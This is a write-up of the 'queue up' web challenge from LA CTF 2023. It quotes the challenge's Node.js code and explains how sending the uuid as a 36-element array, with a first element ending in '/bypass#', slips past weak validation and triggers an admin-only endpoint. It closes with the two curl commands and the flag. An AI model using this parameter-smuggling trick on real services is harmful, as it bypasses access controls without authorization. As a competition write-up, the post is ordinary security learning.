---
Title: queue up - LA CTF 2023
Date: 2023-02-15T00:00:00+05:30
Tags: [web, lactf23-writeups, ctf, writeup, parameter-pollution,]
Categories: [lactf23-writeups,All Writeups]
Authors: [Rohit]

twemoji: true
---

#### tl;dr

- Find the flag server `qu-flag.lac.tf`
- send a request to `https://qu-flag.lac.tf` with the `uuid` as an array and its first element as `{uuid}/bypass#`
- Visit the server with that uuid as a cookie

<!--more-->

## Description

I've put the flag on a web server, but due to the high load, I've had to put a virtual queue in front of it. Just wait your turn patiently, ok? You'll get the flag eventually.

Disclaimer: Average wait time is 61 days.

- **Author** : burturt
- **Category** : Web
- **Points** : 483
- **Solves** : 34


## Solution

### Understanding the challenge

So here we are put on a queue and every 5 minutes one user is given the flag. Now we are so back in the queue that it's impossible to get the flag by waiting.

There are two servers the `flagserver` and `queue` server.

Source codes: [flagserver](files/flagserver/flagserver.js), [queue](files/queue/queue.js)

Here we'll only get the flag when `user.served` is `true`. 

```js
else if (user.served === true) {
    res.render('flagredirect', {uuid: uuid, flagserverurl: process.env.FLAG_SERVER_URL});
    return;
}
```

But for that to happen we have to wait for 100 days. Since we can only solve this challenge in the next LA CTF we can't wait for 100 days. 

So another way is there is an `/api/:uuid/bypass`. It can only be accessed by the admin. We also have `/api/:uuid/status` which will check if `user.served` is true. Also only accessible by admin.

```js
app.get("/api/:uuid/status", async (req, res) => {
    try {
        const user = await Queue.findByPk(req.params.uuid);
        res.send(user.served);

    } catch {
        res.send("false");
    }

});

app.get("/api/:uuid/bypass", async (req, res) => {
    try {
        const user = await Queue.findByPk(req.params.uuid);
        if (user === undefined) {
            res.send("uuid not found");
        } else {
            await user.update({served: true});
            res.send("bypassed");
        }
    } catch {
        res.send("invalid uuid");
    }

});
```

Admin's access is checked using

```js
const adminOnly = function (req, res, next) {
    const authHeader = req.get("Authorization");
    if (authHeader === `Bearer ${process.env.ADMIN_SECRET}`) {
        next();
    } else {
        res.status(403);
        res.send("Either this page doesn't exist or you don't have permission to view this page.");
    }
}
```

Then in the flag server's code, we can send the uuid, it has some checks and it will then check through `/api/:uuid/status` whether `user.served` is true or not. If it is true then it will send the flag. But we don't have the URL (that's what I thought). We will only get a page with that URL if `user.served` is true.

```js
app.post("/", async function (req, res) {
    let uuid;
    try {
        uuid = req.body.uuid;
    } catch {
        res.redirect(process.env.QUEUE_SERVER_URL);
        return;
    }

    if (uuid.length != 36) {
        res.redirect(process.env.QUEUE_SERVER_URL);
        return;
    }
    for (const c of uuid) {
        if (!/[-a-f0-9]/.test(c)) {
            res.redirect(process.env.QUEUE_SERVER_URL);
            return;
        }
    }


    const requestUrl = `http://queue:${process.env.QUEUE_SERVER_PORT}/api/${uuid}/status`;
    try {
        const result = await (await fetch(requestUrl, {
            headers: new Headers({
                'Authorization': 'Bearer ' + process.env.ADMIN_SECRET
            })
        })).text();
        if (result === "true") {
            console.log("Gave flag to UUID " + uuid);
            res.send(process.env.FLAG);
        } else {
            res.redirect(process.env.QUEUE_SERVER_URL);
        }
    } catch {
        res.redirect(process.env.QUEUE_SERVER_URL);
    }

});
```

### Finding something which is given

So my first task was to find the flag server's URL. I first tried with [crt.sh](https://crt.sh/) but it didn't work. Then I started to just try different combinations manually.

I tried many combinations and found `qu-flag.lac.tf` which was the flag server's URL. Only for us to later find out that it was given in the challenge description :cry:. We didn't find it because a get request to the flag server's URL would only redirect us to the queue server's URL. So what we were seeing on the browser was just the queue server's URL.

### Parameter pollution

So there are two checks

```js
if (uuid.length != 36) {
    res.redirect(process.env.QUEUE_SERVER_URL);
    return;
}
for (const c of uuid) {
    if (!/[-a-f0-9]/.test(c)) {
        res.redirect(process.env.QUEUE_SERVER_URL);
        return;
    }
}
```

But they don't check whether the `uuid` is a string or not. So what we can do is send `uuid` as an array. We can send it like `uuid[]=payload`. But we have to send exactly 36 of them. we will put a `#` at the last of the first element so when `toString` is called rest is ignored.

The second check will also pass as the regex will only check if any of the characters is present in the string, not that all the characters of the string are from this specified set

We can give the first as `uuid[]={uuid}/bypass#` and the rest 35 as `uuid[]=a`. This will make served true for this user and then we can send another request to the flag server with the same uuid and we will get the flag.

```bash
curl -X POST https://qu-flag.lac.tf/ -d "uuid[]=4502e7c2-c987-42f7-8a10-95a06c588573/bypass#&uuid[]=a&uuid[]=a&uuid[]=a&uuid[]=a&uuid[]=a&uuid[]=a&uuid[]=a&uuid[]=a&uuid[]=a&uuid[]=a&uuid[]=a&uuid[]=a&uuid[]=a&uuid[]=a&uuid[]=a&uuid[]=a&uuid[]=a&uuid[]=a&uuid[]=a&uuid[]=a&uuid[]=a&uuid[]=a&uuid[]=a&uuid[]=a&uuid[]=a&uuid[]=a&uuid[]=a&uuid[]=a&uuid[]=a&uuid[]=a&uuid[]=a&uuid[]=a&uuid[]=a&uuid[]=a&uuid[]=a"

curl -X POST https://qu-flag.lac.tf/ -d "uuid=4502e7c2-c987-42f7-8a10-95a06c588573"
```

**Flag**: `lactf{Byp455in_7he_Qu3u3}`